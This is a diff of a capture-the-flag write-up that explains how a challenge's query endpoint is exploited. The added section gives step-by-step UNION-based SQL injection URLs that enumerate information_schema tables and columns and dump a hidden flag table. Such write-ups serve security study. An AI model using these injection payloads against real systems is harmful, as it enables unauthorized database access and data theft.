@@ -60,8 +60,8 @@ variable we get as many characters as we want.
 
 ### Hidden Vulnerability
 
-The hidden vulnerability to this statement is actually hinted at in the statement itself, particularly the flag location.
-This string contains the flag commented into the statement. 
+The hidden vulnerability to this statement is actually hinted at in the statement itself, particularly a flag location (NOTE: This is not the flag for this challenge. This is the flag for LIMITED 1).
+This string contains a flag commented into the statement. 
 
 ![image](https://github.com/user-attachments/assets/d77496b6-a32f-445b-be38-f9d2294b98c0)
 
@@ -89,3 +89,37 @@ https://website.com/query?price_op==0/*&limit=*/ UNION SELECT 1, 1, 1, 1
 ![image](https://github.com/user-attachments/assets/a4cacfd3-c26c-4895-b49d-bf5c0085f821)
 
 We now have a successful method for SQL injection.
+
+### SQL Injection Payload
+
+The challenge hint says that the flag is located in another table. We can print out the tables using `information_schema.tables`
+
+```URL
+https://website.com/query?price_op==0/*&limit=*/ UNION SELECT 1, 1, 1, table_name FROM information_schema.tables
+```
+
+![image](https://github.com/user-attachments/assets/6cd6e981-a29b-4a46-82c5-c3f5638c25f3)
+
+We see a table of interest labeled Flag_843423739.
+
+We will look at the columns inside of flag using `information_schema.columns`
+
+
+```URL
+https://website.com/query?price_op==0/*&limit=*/ UNION SELECT 1, 1, 1, column_name FROM information_schema.columns where table_name="Flag_843423739"
+```
+
+![image](https://github.com/user-attachments/assets/ea4138ab-42c5-450d-a377-261ce12d6c73)
+
+We see one column labeled value. Now we can simply query the value column from the table.
+
+```URL
+https://website.com/query?price_op==0/*&limit=*/ UNION SELECT 1, 1, 1, value FROM Flag_843423739
+```
+
+And this returns the flag.
+
+## Important Concepts
+- SQL Injection
+- information_schema.tables
+- information_schema.columns
